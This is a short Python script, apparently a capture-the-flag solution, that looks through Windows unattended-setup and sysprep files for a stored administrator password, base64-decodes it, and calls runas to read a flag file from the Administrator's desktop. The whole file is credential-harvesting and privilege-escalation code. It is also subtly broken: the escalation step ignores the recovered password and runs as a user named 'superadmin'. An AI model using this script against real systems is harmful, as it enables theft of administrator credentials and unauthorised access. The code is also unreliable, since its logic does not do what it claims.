import os
import re
import base64
import subprocess

def find_sensitive_files():
    search_paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\autounattend.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.inf"
    ]
    for path in search_paths:
        if os.path.exists(path):
            return path
    return None

def extract_password(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
        match = re.search(r'<AdministratorPassword>\s*<Value>(.*?)</Value>', content)
        if match:
            return match.group(1)
    return None

def decode_password(encoded_password):
    try:
        return base64.b64decode(encoded_password).decode('utf-8')
    except Exception:
        return encoded_password

def escalate_privileges(admin_password):
    command = f'runas /user:superadmin "cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt"'
    subprocess.run(command, shell=True)

if __name__ == "__main__":
    file_path = find_sensitive_files()
    if file_path:
        password = extract_password(file_path)
        if password:
            decoded_password = decode_password(password)
            escalate_privileges(decoded_password)